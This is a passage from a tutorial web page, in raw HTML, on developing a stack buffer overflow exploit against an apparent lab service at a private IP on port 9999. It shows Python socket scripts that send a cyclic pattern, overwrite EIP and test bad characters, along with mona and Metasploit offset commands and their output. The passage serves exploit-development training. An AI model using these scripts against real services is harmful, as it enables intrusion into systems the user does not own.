class="token plain">retn </span><span class="token operator" style="color:rgb(127, 219, 202)">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(173, 219, 103)">&quot;&quot;</span><span class="token plain"> </span><span class="token comment" style="color:rgb(99, 119, 119);font-style:italic"># this will overwrite the EIP</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">padding </span><span class="token operator" style="color:rgb(127, 219, 202)">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(173, 219, 103)">&quot;&quot;</span><span class="token plain"> </span><span class="token comment" style="color:rgb(99, 119, 119);font-style:italic"># optional.</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">payload </span><span class="token operator" style="color:rgb(127, 219, 202)">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(173, 219, 103)">&quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0A...&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">postfix </span><span class="token operator" style="color:rgb(127, 219, 202)">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(173, 219, 103)">&quot;&quot;</span><span class="token plain"> </span><span class="token comment" style="color:rgb(99, 119, 119);font-style:italic"># optional</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token builtin" style="color:rgb(130, 170, 255)">buffer</span><span class="token plain"> </span><span class="token operator" style="color:rgb(127, 219, 202)">=</span><span class="token plain"> overflow </span><span class="token operator" style="color:rgb(127, 219, 202)">+</span><span class="token plain"> retn </span><span class="token operator" style="color:rgb(127, 219, 202)">+</span><span class="token plain"> padding </span><span class="token operator" style="color:rgb(127, 219, 202)">+</span><span class="token plain"> payload </span><span class="token operator" style="color:rgb(127, 219, 202)">+</span><span class="token plain"> postfix</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token keyword" style="color:rgb(127, 219, 202)">print</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token string" style="color:rgb(173, 219, 103)">&quot;buffer=&quot;</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token builtin" style="color:rgb(130, 170, 255)">len</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token builtin" style="color:rgb(130, 170, 255)">buffer</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">s </span><span class="token operator" style="color:rgb(127, 219, 202)">=</span><span class="token plain"> socket</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token plain">socket</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token plain">socket</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token plain">AF_INET</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"> socket</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token plain">SOCK_STREAM</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token keyword" style="color:rgb(127, 219, 202)">try</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">  s</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token plain">connect</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token plain">ip</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"> port</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">  </span><span class="token keyword" style="color:rgb(127, 219, 202)">print</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token string" style="color:rgb(173, 219, 103)">&quot;Sending evil buffer...&quot;</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">  s</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token plain">send</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token builtin" style="color:rgb(130, 170, 255)">bytes</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token plain">payload </span><span class="token operator" style="color:rgb(127, 219, 202)">+</span><span class="token plain"> </span><span class="token string" style="color:rgb(173, 219, 103)">&quot;\r\n&quot;</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(173, 219, 103)">&quot;latin-1&quot;</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">  </span><span class="token keyword" style="color:rgb(127, 219, 202)">print</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token string" style="color:rgb(173, 219, 103)">&quot;Done!&quot;</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token keyword" style="color:rgb(127, 219, 202)">except</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">  </span><span class="token keyword" style="color:rgb(127, 219, 202)">print</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token string" style="color:rgb(173, 219, 103)">&quot;Could not connect.&quot;</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><br></span></code></pre></div></div>
<p>When the program crashes you have two ways of finding the offset</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="using-mona">Using Mona<a href="#using-mona" class="hash-link" aria-label="Direct link to Using Mona" title="Direct link to Using Mona">‚Äã</a></h3>
<p>In the Immunity Debugger, run this to find offset via mona: <code>!mona findmsp -distance 6700</code></p>
<p>Output will look like this:</p>
<div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#d6deeb;--prism-background-color:#011627"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar" style="color:#d6deeb;background-color:#011627"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#d6deeb"><span class="token plain">Log data, item 18</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"> Address=0BADF00D</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"> Message=    EIP contains normal pattern : 0x48367648 (offset 6108)</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="using-metasploit">Using Metasploit<a href="#using-metasploit" class="hash-link" aria-label="Direct link to Using Metasploit" title="Direct link to Using Metasploit">‚Äã</a></h3>
<p>Or use the 2nd part of the the metasploit pattern tool, the <code>pattern_offset</code> script:</p>
<p>First, read the EIP value in Immunity Debugger:</p>
<p>e.g. EIP value on crash = <code>48367648</code></p>
<p>Then use the pattern offset tool from metasploit to find the offset:</p>
<div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#d6deeb;--prism-background-color:#011627"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar" style="color:#d6deeb;background-color:#011627"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#d6deeb"><span class="token plain">/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 6700 -q 48367648</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Exact match at offset 6108</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="control-the-eip">Control the EIP<a href="#control-the-eip" class="hash-link" aria-label="Direct link to Control the EIP" title="Direct link to Control the EIP">‚Äã</a></h2>
<p>Now that you know the offset, theoretically you should be able to create an <code>overflow</code> of length=offset which will fill the buffer right up to the start of the EIP, and then the value you set for <code>retn</code> should be written over the EIP, which in the case below is 4 x B&#x27;s i.e. <code>BBBB</code>.</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#d6deeb;--prism-background-color:#011627"><div class="codeBlockTitle_OeMC">eip.py</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#d6deeb;background-color:#011627"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token comment" style="color:rgb(99, 119, 119);font-style:italic">#!/usr/bin/env python3</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token keyword" style="color:rgb(127, 219, 202)">import</span><span class="token plain"> socket</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">ip </span><span class="token operator" style="color:rgb(127, 219, 202)">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(173, 219, 103)">&quot;172.16.2.125&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">port </span><span class="token operator" style="color:rgb(127, 219, 202)">=</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">9999</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">offset </span><span class="token operator" style="color:rgb(127, 219, 202)">=</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">6108</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">overflow </span><span class="token operator" style="color:rgb(127, 219, 202)">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(173, 219, 103)">&quot;A&quot;</span><span class="token plain"> </span><span class="token operator" style="color:rgb(127, 219, 202)">*</span><span class="token plain"> offset</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">retn </span><span class="token operator" style="color:rgb(127, 219, 202)">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(173, 219, 103)">&quot;BBBB&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token builtin" style="color:rgb(130, 170, 255)">buffer</span><span class="token plain"> </span><span class="token operator" style="color:rgb(127, 219, 202)">=</span><span class="token plain"> overflow </span><span class="token operator" style="color:rgb(127, 219, 202)">+</span><span class="token plain"> retn</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token keyword" style="color:rgb(127, 219, 202)">print</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token string" style="color:rgb(173, 219, 103)">&quot;buffer=&quot;</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token builtin" style="color:rgb(130, 170, 255)">len</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token builtin" style="color:rgb(130, 170, 255)">buffer</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"> </span><span class="token comment" style="color:rgb(99, 119, 119);font-style:italic"># check the buffer length</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">s </span><span class="token operator" style="color:rgb(127, 219, 202)">=</span><span class="token plain"> socket</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token plain">socket</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token plain">socket</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token plain">AF_INET</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"> socket</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token plain">SOCK_STREAM</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token keyword" style="color:rgb(127, 219, 202)">try</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">  s</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token plain">connect</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token plain">ip</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"> port</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">  </span><span class="token keyword" style="color:rgb(127, 219, 202)">print</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token string" style="color:rgb(173, 219, 103)">&quot;Crash Overwrite EIP: 42424242...&quot;</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">  s</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token plain">send</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token builtin" style="color:rgb(130, 170, 255)">bytes</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token builtin" style="color:rgb(130, 170, 255)">buffer</span><span class="token plain"> </span><span class="token operator" style="color:rgb(127, 219, 202)">+</span><span class="token plain"> </span><span class="token string" style="color:rgb(173, 219, 103)">&quot;\r\n&quot;</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(173, 219, 103)">&quot;latin-1&quot;</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">  </span><span class="token keyword" style="color:rgb(127, 219, 202)">print</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token string" style="color:rgb(173, 219, 103)">&quot;Done!&quot;</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token keyword" style="color:rgb(127, 219, 202)">except</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">  </span><span class="token keyword" style="color:rgb(127, 219, 202)">print</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token string" style="color:rgb(173, 219, 103)">&quot;Could not connect.&quot;</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><br></span></code></pre></div></div>
<p>If your fuzz and offset work is correct, when you run the <code>eip.py</code> script and the application crashes, the EIP value should show <code>42424242</code> i.e. 4 x B&#x27;s.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="bad-character-check">Bad Character Check<a href="#bad-character-check" class="hash-link" aria-label="Direct link to Bad Character Check" title="Direct link to Bad Character Check">‚Äã</a></h2>
<blockquote>
<p>Why do we care?</p>
</blockquote>
<p>A bad character in our shellcode will bork the whole thing up, so we need to understand which characters from a <code>byte array</code> of all possible characters, could be bad and mess up our exploit so we can exclude them from any generated shellcode.</p>
<p>First, because we&#x27;re going to use mona a lot here, setup the mona working directory to make things easier for us:</p>
<p><code>!mona config -set workingfolder C:\Users\IEUser\Downloads\%p</code> - this is my win7 VM.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="mona-bytearray">!mona bytearray<a href="#mona-bytearray" class="hash-link" aria-label="Direct link to !mona bytearray" title="Direct link to !mona bytearray">‚Äã</a></h3>
<p>In Immunity Debugger, run this mona command: <code>!mona bytearray -b &quot;\x00&quot;</code> to generate the &quot;nullbyte array&quot; i.e. the full bytearray minus the null byte <code>\x00</code>.</p>
<p>You can find the text file of the byte array to copy in the working directory we set just before (<code>C:\Users\IEUser\Downloads\%p</code>), if you want to open + copy/paste to your script below.</p>
<p>Other ways of generating all possible characters:</p>
<div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#d6deeb;--prism-background-color:#011627"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar" style="color:#d6deeb;background-color:#011627"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#d6deeb"><span class="token plain"># Python</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">for i in range(0,256): print(&#x27;\\x%02X&#x27; % i, end=&#x27;&#x27;)</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"># Bash</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">for i in {0..255}; do printf &quot;\\\x%02x&quot; $i;done</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="badcharpy">badchar.py<a href="#badcharpy" class="hash-link" aria-label="Direct link to badchar.py" title="Direct link to badchar.py">‚Äã</a></h3>
<p>Your bad character script looks like this:</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#d6deeb;--prism-background-color:#011627"><div class="codeBlockTitle_OeMC">badchar.py</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#d6deeb;background-color:#011627"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token comment" style="color:rgb(99, 119, 119);font-style:italic">#!/usr/bin/env python3</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token keyword" style="color:rgb(127, 219, 202)">import</span><span class="token plain"> socket</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">ip </span><span class="token operator" style="color:rgb(127, 219, 202)">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(173, 219, 103)">&quot;172.16.2.125&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">port </span><span class="token operator" style="color:rgb(127, 219, 202)">=</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">9999</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">offset </span><span class="token operator" style="color:rgb(127, 219, 202)">=</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">6108</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">overflow </span><span class="token operator" style="color:rgb(127, 219, 202)">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(173, 219, 103)">&quot;A&quot;</span><span class="token plain"> </span><span class="token operator" style="color:rgb(127, 219, 202)">*</span><span class="token plain"> offset</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">retn </span><span class="token operator" style="color:rgb(127, 219, 202)">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(173, 219, 103)">&quot;BBBB&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">payload </span><span class="token operator" style="color:rgb(127, 219, 202)">=</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token string" style="color:rgb(173, 219, 103)">&quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token string" style="color:rgb(173, 219, 103)">&quot;\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x41\x42&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token string" style="color:rgb(173, 219, 103)">&quot;\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x60\x61\x62\x63&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token string" style="color:rgb(173, 219, 103)">&quot;\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token string" style="color:rgb(173, 219, 103)">&quot;\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token string" style="color:rgb(173, 219, 103)">&quot;\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token string" style="color:rgb(173, 219, 103)">&quot;\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token string" style="color:rgb(173, 219, 103)">&quot;\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token builtin" style="color:rgb(130, 170, 255)">buffer</span><span class="token plain"> </span><span class="token operator" style="color:rgb(127, 219, 202)">=</span><span class="token plain"> overflow </span><span class="token operator" style="color:rgb(127, 219, 202)">+</span><span class="token plain"> retn </span><span class="token operator" style="color:rgb(127, 219, 202)">+</span><span class="token plain"> payload</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token keyword" style="color:rgb(127, 219, 202)">print</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token string" style="color:rgb(173, 219, 103)">&quot;buffer=&quot;</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token builtin" style="color:rgb(130, 170, 255)">len</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token builtin" style="color:rgb(130, 170, 255)">buffer</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"> </span><span class="token comment" style="color:rgb(99, 119, 119);font-style:italic"># check the buffer length</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">s </span><span class="token operator" style="color:rgb(127, 219, 202)">=</span><span class="token plain"> socket</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token plain">socket</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token plain">socket</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token plain">AF_INET</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"> socket</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token plain">SOCK_STREAM</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token keyword" style="color:rgb(127, 219, 202)">try</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">  s</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token plain">connect</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token plain">ip</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"> port</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">  </span><span class="token keyword" style="color:rgb(127, 219, 202)">print</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token string" style="color:rgb(173, 219, 103)">&quot;Sending evil buffer for badchar check...&quot;</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">  s</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token plain">send</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token builtin" style="color:rgb(130, 170, 255)">bytes</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token builtin" style="color:rgb(130, 170, 255)">buffer</span><span class="token plain"> </span><span class="token operator" style="color:rgb(127, 219, 202)">+</span><span class="token plain"> </span><span class="token string" style="color:rgb(173, 219, 103)">&quot;\r\n&quot;</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(173, 219, 103)">&quot;latin-1&quot;</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">  </span><span class="token keyword" style="color:rgb(127, 219, 202)">print</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token string" style="color:rgb(173, 219, 103)">&quot;Done!&quot;</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token keyword" style="color:rgb(127, 219, 202)">except</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">  </span><span class="token keyword" style="color:rgb(127, 219, 202)">print</span><span class="token punctuation" style="color:rgb(199, 146, 